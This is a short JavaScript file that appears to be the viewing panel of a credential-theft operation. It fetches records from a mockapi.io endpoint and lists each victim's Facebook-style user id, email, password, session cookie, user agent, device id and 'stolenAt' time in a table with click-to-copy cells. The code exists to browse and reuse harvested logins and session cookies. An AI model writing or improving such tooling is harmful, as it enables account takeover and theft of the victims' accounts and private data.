const API = "https://65954b4d04335332df8268cd.mockapi.io/saved";

const tbody = document.querySelector("tbody");

function fillDataToTable() {
    fetch(API)
        .then((res) => res.json())
        .then((res) => {
            const html = res
                .map((user, index) => {
                    return `<tr>
                <td>${index + 1}</td>
                <td data-bs-coppy="${user.c_user}">${user.c_user}</td>
                <td data-bs-coppy="${user.email}">${user.email}</td>
                <td data-bs-coppy="${user.password}">${user.password}</td>

                <td  data-bs-coppy="${user.cookie}" class="short-view" style='color: ${
                        user.cookie && user.cookie != "" ? "" : "red !important"
                    }' title="${user.cookie}">
                    ${user.cookie && user.cookie != "" ? user.cookie.split(";")[0] : "unknown"}
                </td>

                <td data-bs-coppy="${user.userAgent}" class="short-view" title="${user.userAgent}">Coppy</td>
                <td data-bs-coppy="${user.device_id}">${user.device_id}</td>
                <td data-bs-coppy="${user.stolenAt}">${user.stolenAt}</td>
                </tr>`;
                })
                .join("");
            tbody.innerHTML = html;
        })
        .finally(() => {
            const tds = document.querySelectorAll("td[data-bs-coppy]");
            tds.forEach((td) => {
                td.onclick = () => {
                    const text = td.getAttribute("data-bs-coppy");
                    navigator.clipboard.writeText(text);
                };
            });
        });
}

(() => fillDataToTable())();
